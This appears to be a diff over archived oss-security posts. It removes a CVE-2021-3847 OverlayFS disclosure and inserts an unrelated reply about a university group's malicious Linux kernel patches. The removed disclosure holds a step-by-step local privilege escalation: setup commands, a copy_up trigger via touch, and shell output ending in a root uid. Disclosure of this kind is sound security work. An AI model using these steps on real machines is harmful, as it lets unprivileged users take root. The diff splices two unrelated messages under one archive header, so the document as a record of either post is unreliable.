@@ -1,114 +1,49 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/14/3
-Message-ID:  <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
-Date: Thu, 14 Oct 2021 18:30:53 +0000
-From: Alon Zahavi <Alon.Zahavi@...erark.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/04/22/15
+Message-ID: <YIHG7sLouq+hZXr8@gmail.com>
+Date: Thu, 22 Apr 2021 11:56:46 -0700
+From: Eric Biggers <ebiggers@...nel.org>
+To: oss-security@...ts.openwall.com
+Subject: Re: Malicious commits to Linux kernel as part of university study
 Content-Type: text/plain; charset=utf-8
 
+On Thu, Apr 22, 2021 at 06:49:15PM +0100, Mark Steward wrote:
+> On Thu, Apr 22, 2021 at 6:23 PM Ariadne Conill <ariadne@...eferenced.org> wrote:
+> ...
+> > By mining the LKML archive, it may be possible to find the original set of
+> > patch submissions by searching for similar keywords as the messages from
+> > Aditya.  If somebody can do that, then we would be able to determine at
+> > least some of the emails likely to have originated the patches.
+> >
+> 
+> This looks like a good guess to me, and if correct, means none of the
+> submissions in the paper were successful:
+> 
+>   https://lore.kernel.org/linux-nfs/YIEqt8iAPVq8sG+t@sol.localdomain/
+> 
 
-After disclosing the issue with the linux-distros mailing list, I am reporting the security issue publicly to here.
-There is no patch available and may not be available for a long time because the kernel can’t enforce the mitigation proposed, as that would be a layering violation and could also possibly cause a regression.
-This vulnerability was attached with CVE-2021-3847.
-Here is the report that was initially sent:
+Note that one of the patches (the one matching Figure 11 in their paper) did get
+accepted and is in mainline.  However, it doesn't actually have a bug as
+intended, apparently because the author misunderstood what pci_disable_device()
+does.  So I'm not sure what the story is for that patch.  Incompetence is
+normally much more likely than malice, but this case would be doubly incompetent
+(failing to actually write a malicious patch and then putting it in their paper
+anyway, *and* failing to notice that the patch was accepted and still claiming
+that none of their patches were accepted) so it's a bit strange.
 
-## Bug Class
-Escalation of privileges - Bypassing the security extended attribute attachment restrictions (in order to modify the security.capability xattr, a process will need CAP_SYS_ADMIN or CAP_SETFCAP).
-# Technical Details
-## Summary:
-An attacker with a low-privileged user on a Linux machine with an overlay mount which has a file capability in one of its layers may escalate his privileges up to root when copying a capable file from a nosuid mount into another mount.
-## In details:
-If there is an overlay mount that one of its lower layers contains a file with capabilities and in case that the lower layer is a nosuid mount (which means the file capabilities are being ignored at execution), an attacker with low-privileges user can touch the file, which causes the overlayFS driver to copy_up the file with its capabilities into the upper layer. That way the attacker can now execute the file with the file's capabilities, thus escalating its privileges.
-See attached image.
-## Build:
-Any Linux machine with a support for overlayFS.
-For example: AWS EC2 Ubuntu 20.04.
-Mount a device to any folder.
-Copy any file with capabilities into that folder.
-Remount the device now with nosuid option.
-mount an overlayFS mount where there are two layers. Make sure the lower directory is the directory with the capable file.
-## Execution:
-As a low-priv user cd into the merged directory.
-Execute touch capable_file
-cd to the upper layer directory.
-Execute the capable binary.
-## Expected Results:
-When copying a capable file using a low privileges user, the file should be copied without any file capabilities. As the Linux kernel restricts the copying of a file with capabilities, so low-pric user should not be able to achieve this goal.
-## Observed Results:
-The new file that appears in the upper layer directory have the same capabilities as the file that had been copied. This behavior occur probably because the overlay driver's process is the one responsible for the copying, and it copies the whole file with its extended attributes.
+It's also possible that this patch is misidentified, but it seems pretty likely
+it's correct given that that email account has only submitted two patches, both
+on the same day in the time frame expected for the paper, which both matched
+code snippets from the paper.  The other email account also had very similar
+characteristics as well as a clearly fake name.
 
+Anyway, the apparent misconduct of this university group aside, the real story
+here is that people are going to (or at least *should*) be more careful about
+reviewing Linux kernel patches, which is a good thing.  But yes, it appears that
+of the malicious patches that were sent, only one was accepted (even into a
+maintainer tree) and that was because it was actually a correct patch.  (That's
+assuming that the new patches from Aditya Pakki aren't also malicious, which I
+personally think they aren't, but naturally they don't get the benefit of the
+doubt anymore given that they're apparently part of the same research group.)
 
-########## Example ##########
-# there are two mount in question
-$ cd /home/user/overlayfs/
-
-$ ls -l
-drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
-drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
-drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
-drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
-drwxrwxr-x 3 user user   4096 Sep 19 14:25 work
-
-# there are two mount in question.
-# lowerUSB is a mount of an USB, which has a capable file inside.
-# IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be ignored while executing it.
-# The second mount is the overlay mount. Its lower directory is `lowerUSB/` which is the first mount mentioned above. Its upper is just a regular directory on the root fs.
-$ mount
-/dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relatime,uhelper=udisks2)
-overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=lowerUSB,upperdir=upper,workdir=work)
-
-# The contents of all the directories.
-$ ls -l *
-lowerUSB:
-total 40
--rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
-drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-
-merge:
-total 40
--rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
-drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-
-test:
-total 0
-
-upper:
-total 0
-
-work:
-total 4
-d--------- 2 root root 4096 Sep 19 14:25 work
-
-# escalate is an executable that set its uid and gid to 0.
-$ getcap ./lowerUSB/escalate
-./lowerUSB/escalate = cap_setgid,cap_setuid+eip
-
-$ id
-uid=1000(user) gid=1000(user) groups=1000(user)
-
-# When trying to execute ./lowerUSB/escalate, it does not work because it is a `nosuid` mount.
-$ ./lowerUSB/escalate
-[-] Failure
-
-# Try to copy the binary with its capabilities.
-# It should not work, because regular users are not allowed to copy the "security.capability" xattr.
-$ cp --preserve=all ./lowerUSB/escalate ./test/escalate
-cp: setting attribute 'security.capability' for 'security.capability': Operation not permitted
-
-# Trigger the copy_up
-$ touch ./merge/escalate
-$ ls -l ./upper/
--rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate
-
-# The copy_up kept the binary capabilities (xattr)
-$ getcap ./upper/escalate
-./upper/escalate = cap_setgid,cap_setuid+eip
-
-# executing the binary, with the capabilities, so the privileges will escalate to root.
-$ ./upper/escalate
-$ id
-uid=0(root) gid=0(root) groups=0(root)
-
-
-
+- Eric
